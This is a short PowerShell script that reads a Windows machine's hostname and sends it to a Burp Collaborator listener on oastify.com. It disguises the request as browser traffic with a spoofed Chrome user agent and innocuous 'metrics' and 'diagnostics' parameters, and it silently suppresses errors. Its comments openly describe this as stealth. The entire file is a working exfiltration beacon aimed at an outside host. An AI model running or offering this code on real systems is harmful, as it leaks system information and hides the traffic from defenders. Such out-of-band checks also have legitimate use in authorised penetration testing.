# Retrieve hostname from environment variable
$hostname = $env:COMPUTERNAME

# Burp Collaborator/Server URL (replace with your listener)
$burpUrl = "http://7bjqnh89in6l3deivm6042jr8ie92zqo.oastify.com" 

# Craft innocuous-looking request
$requestUri = "$burpUrl`?metrics=[$(Get-Date -Format 'HHmmss')]&diagnostics=$hostname"

# Disguise as browser traffic
$userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"

# Execute request with stealth measures
try {
    $response = Invoke-WebRequest -Uri $requestUri -UserAgent $userAgent `
        -TimeoutSec 3 -ErrorAction SilentlyContinue
}
catch {
    # Intentionally suppress errors
    Out-Null
}